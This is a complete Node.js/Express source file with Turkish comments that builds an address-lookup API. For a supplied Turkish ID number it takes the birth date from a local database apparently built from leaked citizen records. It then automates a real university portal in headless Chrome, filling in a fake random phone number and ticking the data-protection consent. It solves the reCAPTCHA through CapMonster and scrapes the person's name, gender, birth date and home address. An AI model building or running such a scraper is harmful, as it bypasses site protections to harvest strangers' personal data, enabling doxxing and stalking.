const express = require('express');
const mysql = require('mysql2/promise');
const axios = require('axios');
const { Builder, By, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');

const app = express();
const PORT = 1943;

// CapMonster API ve site bilgileri
const CAPMONSTER_API_KEY = 'CAPMONSTER_API_KEY';
const SITE_KEY = 'CAPMONSTER_SITE_KEY';
const PAGE_URL = 'https://adusem.adu.edu.tr/?p=egitim-portal';

// Rastgele telefon numarası üretme fonksiyonu
const generateRandomPhoneNumber = () => {
    const operatorCodes = ['50', '51', '52', '53', '54', '55', '56', '57', '58'];
    const randomOperatorCode = operatorCodes[Math.floor(Math.random() * operatorCodes.length)];
    const randomNumber = Math.floor(1000000 + Math.random() * 9000000);
    return `5${randomOperatorCode} ${String(randomNumber).slice(0, 3)} ${String(randomNumber).slice(3, 5)} ${String(randomNumber).slice(5)}`;
};

// Doğum tarihi formatlama fonksiyonu
const formatDateForAPI = (dogumtarihi) => {
    const [day, month, year] = dogumtarihi.split('.');
    return `${day.padStart(2, '0')}/${month.padStart(2, '0')}/${year}`;
};

// Veritabanından kullanıcı doğum tarihini alma fonksiyonu
const getUserInfoFromDB = async (tc) => {
    const connection = await mysql.createConnection({
        host: 'localhost',
        user: 'root',
        password: '',
        database: '101m'
    });
    const [rows] = await connection.execute('SELECT DOGUMTARIHI FROM 101m WHERE TC = ?', [tc]);
    await connection.end();
    return rows[0] ? rows[0].DOGUMTARIHI : null;
};

// CAPTCHA çözümü için CapMonster API kullanma fonksiyonu
const solveCaptcha = async () => {
    const response = await axios.post('https://api.capmonster.cloud/createTask', {
        clientKey: CAPMONSTER_API_KEY,
        task: {
            type: 'RecaptchaV2Task',
            websiteURL: PAGE_URL,
            websiteKey: SITE_KEY
        }
    });

    const taskId = response.data.taskId;

    if (!taskId) {
        throw new Error('CAPTCHA çözüm talebi başarısız: ' + response.data.error || 'Bilinmeyen hata');
    }

    // CAPTCHA çözümünün tamamlanmasını bekleme döngüsü
    while (true) {
        await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5 saniye bekleme süresi
        const resultResponse = await axios.post('https://api.capmonster.cloud/getTaskResult', {
            clientKey: CAPMONSTER_API_KEY,
            taskId: taskId
        });

        const result = resultResponse.data;
        if (result.status === 'ready') {
            return result.solution.gRecaptchaResponse;
        }
        if (result.errorId) {
            throw new Error('CAPTCHA çözüm alma hatası: ' + result.errorId);
        }
    }
};

// Kullanıcı bilgilerini formdan alma fonksiyonu
const getUserInfo = async (driver) => {
    const userInfo = {};
    userInfo.TCKN = await driver.findElement(By.xpath("//label[contains(text(), 'T.C. Kimlik No')]/following-sibling::div")).getText();
    userInfo.ADSOYAD = await driver.findElement(By.xpath("//label[contains(text(), 'Ad Soyad')]/following-sibling::div")).getText();
    userInfo.DOGUMTARİHİ = await driver.findElement(By.xpath("//label[contains(text(), 'Doğum Tarihi')]/following-sibling::div")).getText();
    userInfo.CİNSİYET = await driver.findElement(By.xpath("//label[contains(text(), 'Cinsiyet')]/following-sibling::div")).getText();
    userInfo.ADRES = await driver.findElement(By.xpath("//label[contains(text(), 'Adresi')]/following-sibling::div")).getText();
    
    return userInfo;
};

// TC işlemi süreci
const processTC = async (tc) => {
    const startTime = Date.now();
    const dogumtarihi = await getUserInfoFromDB(tc);
    if (!dogumtarihi) {
        return { status: 'error', message: 'Kullanıcı bulunamadı.' };
    }

    const formattedDate = formatDateForAPI(dogumtarihi);
    if (!formattedDate) {
        return { status: 'error', message: 'Doğum tarihi formatı geçersiz.' };
    }

    const cepTel = generateRandomPhoneNumber();

    const chromeOptions = new chrome.Options();
    chromeOptions.addArguments("--headless", "--disable-gpu", "--no-sandbox");
    chromeOptions.addArguments("--disable-dev-shm-usage");
    const driver = await new Builder().forBrowser('chrome').setChromeOptions(chromeOptions).build();

    try {
        await driver.get(PAGE_URL);

        await driver.findElement(By.name('tckimlikno')).sendKeys(tc);
        await driver.findElement(By.name('dogumtarihi')).sendKeys(formattedDate);
        await driver.findElement(By.name('ceptel')).sendKeys(cepTel.replace(' ', ''));

        const kvkkCheckbox = await driver.findElement(By.name('kvkk'));
        if (!(await kvkkCheckbox.isSelected())) {
            await kvkkCheckbox.click();
        }

        const captchaSolution = await solveCaptcha();
        await driver.executeScript("document.getElementsByName('g-recaptcha-response')[0].value = arguments[0];", captchaSolution);

        await driver.findElement(By.css('button[type="submit"]')).click();

        // Bekleme fonksiyonu
        await driver.wait(until.elementLocated(By.xpath("//label[contains(text(), 'T.C. Kimlik No')]")), 10000);

        const userInfo = await getUserInfo(driver);
        const elapsedTime = Date.now() - startTime;

        return {
            status: 'success',
            response_time_ms: elapsedTime,
            data: userInfo
        };
    } catch (error) {
        return { status: 'error', message: error.message };
    } finally {
        await driver.quit();
    }
};

// API için adres route'u
app.get('/adres', async (req, res) => {
    const tc = req.query.tc;
    if (tc) {
        const response = await processTC(tc);
        res.json(response);
    } else {
        res.json({ status: 'error', message: 'TC kimlik numarası verilmedi.' });
    }
});

// Sunucuyu başlat
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
